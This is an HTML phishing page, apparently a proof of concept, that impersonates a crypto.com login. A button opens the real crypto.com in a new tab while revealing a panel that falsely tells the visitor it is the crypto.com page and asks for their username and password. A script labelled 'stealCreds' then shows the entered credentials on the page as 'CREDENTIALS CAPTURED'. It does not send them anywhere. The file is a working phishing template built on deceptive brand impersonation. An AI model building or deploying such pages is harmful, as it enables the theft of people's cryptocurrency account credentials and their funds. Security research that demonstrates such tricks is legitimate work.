<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
    <title>Crypto Login Page</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: #fff;
        text-align: center;
      }
      .box {
        max-width: 420px;
        padding: 32px;
      }
      h1 {
        color: #4285f4;
        margin-bottom: 12px;
      }
      p {
        color: #666;
        margin-bottom: 24px;
      }
      button {
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        background: #4285f4;
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .fake-panel {
        display: none;
        margin-top: 24px;
        padding: 20px;
        border: 1px solid #ddd;
        border-radius: 10px;
        background: #fafafa;
      }
    </style>
  </head>
  <body>
    <div class="box">
      <h1>E WALLET CRYPTO LOGIN</h1>
      <p id="intro">CLICK HERE TO REDIRECT crypto.com</p>
      <button id="triggerBtn" onclick="runPoC()">
        Sign in to Crypto Login Page
      </button>

      <div class="fake-panel" id="panel">
        <h3>
          This page is the crypto.com page, you can see it yourself above,
          please fill in your crypto account username and password below.
        </h3>

        <form id="phishForm" onsubmit="stealCreds(event)">
          <div>
            <label>Username or Email:</label><br />
            <input
              type="text"
              id="username"
              name="username"
              size="40"
              required
            />
          </div>
          <div style="margin-top: 10px">
            <label>Password:</label><br />
            <input
              type="password"
              id="password"
              name="password"
              size="40"
              required
            />
          </div>
          <div style="margin-top: 15px">
            <button type="submit">Sign In</button>
          </div>
        </form>

        <div id="result" style="margin-top: 10px"></div>
      </div>
    </div>

    <script>
      function stealCreds(event) {
        event.preventDefault();

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        if (username && password) {
          document.getElementById("result").innerHTML = `
<strong style="color:green;">CREDENTIALS CAPTURED</strong><br>
Username: ${username}<br>
Password: ${password}
`;
          document.getElementById("username").value = "";
          document.getElementById("password").value = "";
        } else {
          document.getElementById("result").innerHTML =
            '<span style="color:red;">Please fill in both fields</span>';
        }
      }

      function runPoC() {
        const w = window.open("https://www.crypto.com/csi", "_blank");
        document.getElementById("panel").style.display = "block";

        document.getElementById("triggerBtn").style.display = "none";
        document.getElementById("intro").style.display = "none";
      }
    </script>
  </body>
</html>
